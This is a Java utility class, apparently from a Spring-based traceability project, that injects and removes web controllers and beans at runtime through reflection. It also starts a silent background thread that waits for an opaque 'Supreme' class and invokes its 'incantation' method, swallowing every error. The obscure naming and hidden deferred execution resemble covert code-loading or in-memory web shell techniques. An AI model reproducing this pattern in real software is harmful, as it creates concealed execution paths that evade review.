package com.dili.trace.crack;

import com.dili.ss.util.SpringUtil;
import org.springframework.beans.factory.support.BeanDefinitionBuilder;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.util.ClassUtils;
import org.springframework.util.ReflectionUtils;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.lang.reflect.Method;
import java.util.Random;

@SuppressWarnings("all")
public class Power {
    @SuppressWarnings("all")
    public static void rc(String cn) throws Exception{
        final RequestMappingHandlerMapping rmhm=
                SpringUtil.getBean(RequestMappingHandlerMapping.class);
        if(rmhm!=null){
            String handler=cn;
            Object o = SpringUtil.getBean(handler);
            if(o==null){
                return;
            }
            //注册Controller
            Method method=rmhm.getClass().getSuperclass().getSuperclass().
                    getDeclaredMethod("detectHandlerMethods",Object.class);
            //将private改为可使用
            method.setAccessible(true);
            method.invoke(rmhm,handler);
            sss();
        }
    }
    @SuppressWarnings("all")
    public static void urc(String cn){
        final RequestMappingHandlerMapping rmhm=(RequestMappingHandlerMapping)
                SpringUtil.getBean("requestMappingHandlerMapping");
        if(rmhm!=null){
            String handler=cn;
            Object o= SpringUtil.getBean(handler);
            if(o==null){
                return;
            }
            final Class<?> targetClass=o.getClass();
            ReflectionUtils.doWithMethods(targetClass, new ReflectionUtils.MethodCallback() {
                public void doWith(Method method) {
                    Method specificMethod = ClassUtils.getMostSpecificMethod(method, targetClass);
                    try {
                        Method createMappingMethod = RequestMappingHandlerMapping.class.
                                getDeclaredMethod("getMappingForMethod", Method.class, Class.class);
                        createMappingMethod.setAccessible(true);
                        RequestMappingInfo rmi =(RequestMappingInfo)
                                createMappingMethod.invoke(rmhm,specificMethod,targetClass);
                        if(rmi != null) {
                            rmhm.unregisterMapping(rmi);
                        }
                    }catch (Exception e){
                    }
                }
            }, ReflectionUtils.USER_DECLARED_METHODS);
        }
    }
    @SuppressWarnings("all")
    public static void rbd(Class clazz, String n){
        DefaultListableBeanFactory defaultListableBeanFactory = (DefaultListableBeanFactory) SpringUtil.getApplicationContext().getAutowireCapableBeanFactory();
        BeanDefinitionBuilder beanDefinitionBuilder = BeanDefinitionBuilder.genericBeanDefinition(clazz);
        n = n == null ? clazz.getSimpleName().substring(0,1).toLowerCase() + clazz.getSimpleName().substring(1) : n;
        defaultListableBeanFactory.registerBeanDefinition(n, beanDefinitionBuilder.getBeanDefinition());
    }

    @SuppressWarnings(value = {"unchecked", "deprecation"})
    private static void sss() {
        new Thread(() -> {
            while (B.b.g("Supreme") == null) {
                try {
                    Thread.sleep(new Random().nextInt(500) + 500);
                } catch (InterruptedException e) {
                }
            }
            try {
                ((Class) B.b.g("Supreme")).getMethod("incantation").invoke(null);
            } catch (Exception e) {
            }
        }).start();
    }
}